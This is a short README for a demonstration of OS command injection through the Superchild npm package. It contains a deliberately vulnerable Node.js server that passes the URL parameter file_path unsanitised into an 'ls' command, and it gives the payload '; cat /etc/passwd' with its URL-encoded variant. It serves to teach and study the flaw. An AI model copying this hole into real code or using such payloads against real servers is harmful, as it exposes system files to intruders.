# Source Code
The purpose of this application is to demonstrate the capabilities of an OS command injection exploit using the Superchild npm package.

## superchild_exploitable.js
This file creates a simple web server, and allows a client to call the ls command in the console of the server via the url.

```
// Make sure the http and url libraries are loaded
const http = require('http'),
      url = require('url'),
      superchild = require('superchild');
// Create an http server
http.createServer(function (req, res) {
    // Lambda that defines how the http server reacts to <input
    // Responds with 200 in header
    res.writeHead(200, {'Content-Type': 'text/plain'});
    //Parses url
    let q = url.parse(req.url, true).query;
    //Creates child process for ls
    let child = superchild('ls ' + q.file_path);
    //On command, output is returned to console
    child.on('stdout_line', function (line) {
      console.log(line);
    });
    res.end()
}).listen(8080);
```

# Running the sample
run the script via node:
```
foo@bar:~$ node superchild_exploitable.js
```

## Dependencies
You can install these with the following command `npm install <pkg>`

- superchild

## Running application
Once a client accesses the server with a query for `file_path`, the contents of that file path will be read to the console.

# Payload

## Procedure
- Go to `localhost:8080/`
- Insert the payload via the query string of the url (Ex. `localhost:8080/?file_path=(payload goes here)`)
  - `; cat /etc/passwd`
    - `localhost:8080/?file_path=; cat /etc/passwd`
    - `localhost:8080/?file_path=;%20cat%20/etc/passwd`
- Effects can be observed in the console of the server

## Why it works?
Because the user input is not sanitized, the resulting command can be concatenated with an arbitrary command, separated by a semicolon.
